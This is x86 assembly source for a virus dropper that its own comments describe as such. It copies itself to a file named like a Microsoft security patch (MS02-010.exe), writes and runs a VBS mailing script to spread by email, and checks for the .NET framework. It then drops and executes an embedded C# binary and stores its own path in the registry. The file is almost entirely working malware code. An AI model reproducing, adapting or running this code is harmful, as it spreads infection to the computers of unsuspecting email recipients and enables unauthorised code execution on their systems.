  db 192,0,0,7,255,255,255,255,255,255,255,255,255,255,255,255
  db 40,0,0,0,16,0,0,0,32,0,0,0,1,0,4,0
  db 0,0,0,0,192,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,128,0
  db 0,128,0,0,0,128,128,0,128,0,0,0,128,0,128,0
  db 128,128,0,0,128,128,128,0,192,192,192,0,0,0,255,0
  db 0,255,0,0,0,255,255,0,255,0,0,0,255,0,255,0
  db 255,255,0,0,255,255,255,0,0,0,0,0,0,0,0,0
  db 7,119,119,119,119,119,119,119,68,68,68,68,68,68,68,71
  db 79,255,255,255,255,255,248,71,79,255,255,255,255,255,248,71
  db 79,255,255,255,255,255,248,71,79,255,255,255,255,255,248,71
  db 79,255,255,255,255,255,248,71,79,255,255,255,255,255,248,71
  db 79,255,255,255,255,255,248,71,79,255,255,255,255,255,248,71
  db 72,136,136,136,136,136,136,71,76,204,204,204,204,204,204,71
  db 196,68,68,68,68,68,68,192,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,255,255,0,0,128,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0
  db 255,255,0,0,255,255,0,0,0,0,1,0,2,0,32,32
  db 16,0,1,0,4,0,232,2,0,0,2,0,16,16,16,0
  db 1,0,4,0,40,1,0,0,3,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,32,0,0,12,0,0,0,0,62,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
CSharpName db 'cs.exe',0
mailcopy db 'c:\MS02-010.exe',0
mailname db 'sharp.vbs',0
sysdir db 50 dup(0)
windir db 50 dup(0)
filename db 50 dup(0)
regkey db 'Software\Sharp',0
FileToFind db 'mscoree.dll',0
FoundFile:
dwFileAttributes dd 0
ftCreationTime db 8 dup(0)
ftLastAccessTime db 8 dup(0)
ftLastWriteTime	db 8 dup(0)
nFileSizeHigh	dd 0
nFileSizeLow	dd 0
dwReserved0	dd 0
dwReserved1	dd 0
cFileName	db 50 dup(0)
cAlternateFileName db 50 dup(0)


.code
Start:

	push 0					; First we need to get the filename of the running program (this program, either purely
	call GetModuleHandleA			; the virus dropper, or an infected file).
	push 50
	push offset filename
	push eax
	call GetModuleFileNameA
	
	push 1					; Make a copy to use in mail.
	push offset mailcopy
	push offset filename
	call CopyFileA
	
	cmp eax, 0				; If the copy already existed, this means we've already sent the mail,
	je nomail				; so we skip this part.
	
	push 0					; Create the file for the mailscript.
	push offset mailname
	call _lcreat

	mov ebx, eax				; Save the return value, we still need it.

	push size2				; Write the script to the file.
	push offset mailscript
	push eax
	call _lwrite

	push ebx				; Close the file.
	call _lclose
	
	push 0					; Execute the mailscript.
	push 0
	push 0
	push offset mailname
	push 0
	push 0
	call ShellExecuteA
	
nomail:
	
	push 50					; Find out where the system directory is located.
	push offset sysdir
	call GetSystemDirectoryA
	
	push 50					; Find out where the Windows directory is located.
	push offset windir
	call GetWindowsDirectoryA

	push offset sysdir			; Change the current directory to the system directory.
	call SetCurrentDirectoryA
	
	push offset FoundFile			; Checks if mscoree.dll is there.
	push offset FileToFind
	call FindFirstFileA
	
	cmp cFileName, 0			; If mscoree.dll isn't there, the .NET framework isn't installed,
	je outtahere				; so we can't execute our C# code. Hence, we don't.
	
	push offset windir			; Change the current directory to the windows directory.
	call SetCurrentDirectoryA
	
	push 0					; Create the file for the C# binary.					
	push offset CSharpName
	call _lcreat

	mov ebx, eax				; Save the return value, we still need it.

	push size				; Write the binary to the file.
	push offset CSharpExe
	push eax
	call _lwrite

	push ebx				; Close the file.
	call _lclose
	
	push offset filename			; Find out the length of the filename of the currently running program.
	call lstrlen

	push eax				; Write the name to the registery, so we can use it in our C# code.
	push offset filename
	push 1
	push offset regkey
	push 080000002h
	call RegSetValueA
	
	push 1					; Execute the C# binary.
	push offset CSharpName
	call WinExec

outtahere:

	push 0					; Quit the program.
	call ExitProcess

end Start
